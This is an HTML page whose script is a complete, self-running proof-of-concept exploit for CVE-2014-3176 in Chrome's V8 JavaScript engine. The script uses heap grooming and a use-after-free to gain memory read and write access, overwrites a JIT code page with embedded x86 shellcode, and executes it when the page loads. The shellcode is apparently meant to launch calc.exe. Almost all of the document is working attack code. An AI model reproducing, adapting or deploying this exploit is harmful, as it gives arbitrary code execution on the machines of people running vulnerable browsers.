<html>
<TITLE>
CVE-2014-3176
</TITLE>
<META HTTP-EQUIV="pragma" CONTENT="no-cache"> 
<META HTTP-EQUIV="Cache-Control" CONTENT="no-store, must-revalidate"> 
<META HTTP-EQUIV="expires" CONTENT="0">
<style>
div,h3
{
	font-family: Courier
}
</style>
<body>
<div id="e_div"></div>
<script>
/********************************************************
*constants defined here
********************************************************/
var EXPLOIT_ARRAY_COUNT        		= 0x400
var EXPLOIT_ARRAY_LENGTH       		= 0x200
var EXPLOIT_ARRAYBUFFER_COUNT  		= 0x200000
var EXPLOIT_ARRAYBUFFER_BYTELENGTH  = 10
var EXPLOIT_EVIL_ARRAY_TAG  		= 0x22334411
var EXPLOIT_FILL_ARRAY_TAG   		= 0x11223344


is_debug 	= false

if(is_debug)
{
	alert("attach me:)!")
}


/*********************************************************
*functions used for debugging defined here
*********************************************************/
function log(info)
{
	document.getElementById("e_div").innerHTML += "<h3>"+ info +"</h3>"
}

function breakpoint()
{
	if(is_debug)
	{
		//bp chrome_child!v8::internal::Runtime_MathAtan2 in your debugger.
		Math.atan2(1)
	}
}

function fail(reason)
{
	log("[*]Exploit fail: " + reason)
	log("[*]Aw, Snap:( You'd better have a cup of tea and exploit me again.")
	setTimeout(function(){window.location.reload(true)}, 5000)
	
}


/*********************************************************
*functions used for V8 Heap Feng Shui defined here.
*********************************************************/

function gc()
{
    for (i = 0; i < 50; i++) {
		zz = new ArrayBuffer(0x100000);
		zz = null;
	}
}


function cleanup_my_newspace()
{
	gc()
	gc()
}


function create_evil_array(length)
{
	var a = Array.apply(null, new Array(length)).map(function () {return 0x11111111})
	var b = []
	a.__defineGetter__(0, function (){
		b.length = length
		return EXPLOIT_EVIL_ARRAY_TAG
	})
	return a.concat(b)
}

function create_fill_array(length)
{
	var a = Array.apply(null, new Array(length)).map(function () {return 0x22222222})
	a[0]  = EXPLOIT_FILL_ARRAY_TAG
	return a
}


function exploit()
{
	var tmp = [];
	for (var i = 0; i < 100; i++)
		tmp[i] = Array.apply(null, new Array(200)).map(function () {return 1234;});
	var uaf_arrobj	= tmp[tmp.length/2];
	var arr_evil    = new Array(EXPLOIT_ARRAY_COUNT)
	var arr_fill  	= new Array(EXPLOIT_ARRAY_COUNT)
	var arr_abfs 	= new Array(EXPLOIT_ARRAYBUFFER_COUNT); for (var i = 0; i < arr_abfs.length; i++) arr_abfs[i] = null;
	
	/*
		Step1: create fill array object and evil array object(whose length field alerted by vulnerability) in a loop to make 
			   fill array object's backstore buffer and evil array object's backstore buffer adjacent in heap like this
			   
	     ----->0x44668822 0x22222222 0x22222222 0x22222222
		 +	   0x22222222 0x22222222 0x22222222 0x22222222
		 |	   0x22222222 0x22222222 0x22222222 0x22222222
	     |	   0x22222222 0x22222222 0x22222222 0x22222222    
	     |	   0x22222222 0x22222222 0x22222222 0x22222222    
		 |	   ...                                            
		 +---->0x22446688 0x44444444 0x44444444 0x44444444
		 |	   0x44444444 0x44444444 0x44444444 0x44444444
		 |	   0x44444444 0x44444444 0x44444444 0x44444444
		 |	   0x44444444 0x44444444 0x44444444 0x44444444
	     |	   0x44444444 0x44444444 0x44444444 0x44444444
		 |	   ...
		 ----->0x44668822 0x22222222 0x22222222 0x22222222
		 +	   0x22222222 0x22222222 0x22222222 0x22222222
		 |	   0x22222222 0x22222222 0x22222222 0x22222222
	     |	   0x22222222 0x22222222 0x22222222 0x22222222    
	     |	   0x22222222 0x22222222 0x22222222 0x22222222    
	
	*/
	for(var i=0; i<EXPLOIT_ARRAY_COUNT; i++)
	{
		arr_fill[i]  = create_fill_array(EXPLOIT_ARRAY_LENGTH)
		arr_evil[i]	 = create_evil_array(EXPLOIT_ARRAY_LENGTH)
	}
	
	/*
		store an array object uaf_arrobj in fill array, so it can be reference from evil array like this:
		evil_array[EXPLOIT_ARRAY_LENGTH + 0x22]
	*/
	for(var i=0; i<EXPLOIT_ARRAY_COUNT; i++)
	{
		arr_fill[i][0x20]  = uaf_arrobj
	}
	
	/*
		clean up newspace to make exploit more reliable.
	*/
	cleanup_my_newspace()
	
	/*
		search all evil array object that is adjacent to fill array object.
	*/
	var arr_index = []
	for(var i=0; i<EXPLOIT_ARRAY_COUNT; i++)
	{
		var value = arr_evil[i][EXPLOIT_ARRAY_LENGTH + 2]
		if(Number.isInteger(value) && value == EXPLOIT_FILL_ARRAY_TAG)
		{
			arr_index.push(i)
		}
	}

	/*
		if we can not find any evil array object that is adjacent to fill array object, exploit fail:(
	*/
	if(0 == arr_index.length)
	{
		fail("we can't find any evil array object adjacent to fill array object.")
		return;
	}
	
	/*
		free all fill array objects and uaf_arrobj.
	*/
	arr_fill   = null
	uaf_arrobj = null
	cleanup_my_newspace()
	
	/*
		reference the freed uaf_arrobj whose pointer is still left in heap although it has already been freed.
	*/
	var exploit_arrobj   = null
	for (var i = 0; i < arr_index.length; i++) 
	{
		var v = arr_evil[arr_index[i]][EXPLOIT_ARRAY_LENGTH + 0x22];
		if (typeof v == "object") 
		{
			exploit_arrobj = v
			break
		}
	}
	if(!exploit_arrobj)
	{
		fail("we can't find exploit_arrobj.")
		return
	}
	
	
	
	/*spray ArrayBuffer object in heap, so the freed uaf_arrobj's memory will be filled with ArrayBuffer objects*/
	for(var i=0;  i<arr_abfs.length; i++)
	{
		arr_abfs[i] = new ArrayBuffer(EXPLOIT_ARRAYBUFFER_BYTELENGTH);
	}
	
	
	var index_abf_length = 0
	var index_abf_memptr = 0
	for(var i=1; i<exploit_arrobj.length; i++)
	{
		if(Number.isSafeInteger(exploit_arrobj[i]) && exploit_arrobj[i] == EXPLOIT_ARRAYBUFFER_BYTELENGTH)
		{
			exploit_arrobj[i] = 0x300000
			index_abf_length = i
			index_abf_memptr = i - 1
			break;
		}
	}
	
	/*search the ArrayBuffer object whose byteLength alerted.*/
	var exploit_abfobj = null
	for(var i=0;  i<arr_abfs.length; i++)
	{
		if(arr_abfs[i].byteLength != EXPLOIT_ARRAYBUFFER_BYTELENGTH)
		{
			exploit_abfobj = arr_abfs[i]
		}
	}
	
	if(!exploit_abfobj)
	{
		fail("we can't alert some ArrayBuffer object's byteLength.")
		return
	}
	
	var abf_mem_ptr = 0
	if(is_debug)
	{
		abf_mem_ptr = exploit_arrobj[index_abf_memptr]
		alert("0x" + (abf_mem_ptr * 2).toString(16))
	}
	
	var code = "tmp = [];";
	for (var i = 0; i < 0x10000; i++)
		code += "tmp[" + i + "] = " + i + ";";
	var func_obj = new Function("a", code);
	func_obj();
	
	/*write a function object's pointer to the backstore buffer field of the ArrayBuffer object*/
	exploit_arrobj[index_abf_memptr] = func_obj
	/*read jit code address in function object*/
	var u8 	= new Uint8Array(exploit_abfobj, 11, 4)
	var func_jitaddress = (u8[3] << 0x18) + (u8[2] << 0x10) + (u8[1] << 8) + u8[0]
	/*write jit code address to the backstore buffer field of the ArrayBuffer object*/
	exploit_arrobj[index_abf_memptr] = (func_jitaddress / 2)
	
	/*write shellcode to jit code page with PAGE_EXECUTE_READWRITE*/
	if(is_debug)
	{
	var shellcode = [0xCCCCCCCC, 0x9040ec83, 0x74d9dfdb, 0x2958f424, 0x37e8bec9, 0x32b1e38a, 0x31fce883, 0x98031370, 0xa4166824, 0x54d9e5a3, 0xb1509634, 0xb2078405, 0x96431834, 0x0201d3b4, 0x258d914e, 0x08e81ce7, 0xc63490f8, 0x14c8b23a, 0xd7f0146f, 0x05355562, 0x42ee078c, 0x169bb83f, 0x1d4bb9fc, 0xe1eec1bc, 0x31f07849, 0xa9baf7e1, 0xc81b5089, 0x8367835e, 0x121370eb, 0x25dc493a, 0x8ae30602, 0x2c23568f, 0x4f5f2d70, 0x32a4360d, 0x9439b3c9, 0x259a649a, 0x2969f24e, 0x2d35703b, 0x494d55ba, 0xd8825837, 0x81067f03, 0x6f1f1ed0, 0xd77f1fb6, 0xf50bba67, 0x9351bc7c, 0xdaec4c83, 0x4cef4e84, 0x03647fed, 0x60af806a, 0xc0f2ca84, 0x5166930d, 0x955d2450, 0x6554a76d, 0x601cb78a, 0x18cc7fd6, 0x8ff2ea47, 0x4e913f68, 0x4156a3fb]
	}
	else
	{
	var shellcode = [0x90909090, 0x9040ec83, 0x74d9dfdb, 0x2958f424, 0x37e8bec9, 0x32b1e38a, 0x31fce883, 0x98031370, 0xa4166824, 0x54d9e5a3, 0xb1509634, 0xb2078405, 0x96431834, 0x0201d3b4, 0x258d914e, 0x08e81ce7, 0xc63490f8, 0x14c8b23a, 0xd7f0146f, 0x05355562, 0x42ee078c, 0x169bb83f, 0x1d4bb9fc, 0xe1eec1bc, 0x31f07849, 0xa9baf7e1, 0xc81b5089, 0x8367835e, 0x121370eb, 0x25dc493a, 0x8ae30602, 0x2c23568f, 0x4f5f2d70, 0x32a4360d, 0x9439b3c9, 0x259a649a, 0x2969f24e, 0x2d35703b, 0x494d55ba, 0xd8825837, 0x81067f03, 0x6f1f1ed0, 0xd77f1fb6, 0xf50bba67, 0x9351bc7c, 0xdaec4c83, 0x4cef4e84, 0x03647fed, 0x60af806a, 0xc0f2ca84, 0x5166930d, 0x955d2450, 0x6554a76d, 0x601cb78a, 0x18cc7fd6, 0x8ff2ea47, 0x4e913f68, 0x4156a3fb]
	}
	
	var u32	= new Uint32Array(exploit_abfobj, 0, shellcode.length * 8)
	for(var i=0; i<shellcode.length; i++)
	{
		u32[i] = shellcode[i]
	}
	/*Hello, calc.exe*/
	func_obj()	
}

exploit()
</script>
</body>
</html>
